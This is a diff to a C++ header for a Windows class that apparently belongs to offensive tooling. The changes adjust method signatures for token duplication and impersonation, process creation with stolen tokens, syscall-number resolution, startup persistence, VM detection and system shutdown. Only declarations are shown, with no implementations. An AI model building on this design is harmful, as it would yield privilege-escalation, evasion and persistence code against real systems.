@@ -41,7 +41,7 @@ public:
     HMODULE            GetLoadedLib(std::string libName);            // Return a handle of an already loaded dll from 'loadedDlls'
     BOOL               FreeUsedLibrary(std::string lib);             // Free a loaded library 'lib'
 
-    void               ShutdownSystem(SHUTDOWN_ACTION type);
+    static void        ShutdownSystem(SHUTDOWN_ACTION type);
     DWORD              PIDFromName(const char* name);                // Get the process ID from a process name.
     HANDLE             ImpersonateWithToken(HANDLE token);           // Impersonate security context of 'token' for this thread
     HANDLE             CreateProcessAccessToken(DWORD processID, bool ti=false);    // Duplicate a process security token from the process id
@@ -53,15 +53,15 @@ public:
 
     // Wrapper that uses function pointer for CreateProcessWithTokenW
     BOOL OpenProcessAsImposter(
-        HANDLE                token,
-        DWORD                 dwLogonFlags,
-        LPCWSTR               lpApplicationName,
-        LPWSTR                lpCommandLine,
-        DWORD                 dwCreationFlags,
-        LPVOID                lpEnvironment,
-        LPCWSTR               lpCurrentDirectory,
-        LPSTARTUPINFOW        lpStartupInfo,
-        LPPROCESS_INFORMATION lpProcessInformation
+        HANDLE   token,
+        DWORD    dwLogonFlags,
+        LPCWSTR  lpApplicationName,
+        LPWSTR   lpCommandLine,
+        DWORD    dwCreationFlags,
+        LPVOID   lpEnvironment,
+        LPCWSTR  lpCurrentDirectory,
+        bool     saveOutput,
+        char*    cmdOutput
     );
 
     template <typename fp>
@@ -86,7 +86,7 @@ public:
     static unsigned int GetSSN(HMODULE lib, std::string functionName);
     void AddProcessToStartup(std::string path);
     bool RunningInVirtualMachine();
-    void GetAndInsertSSN(HMODULE lib, std::string functionName);
+    static void GetAndInsertSSN(HMODULE lib, std::string functionName);
     inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
     static FARPROC GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
 private:
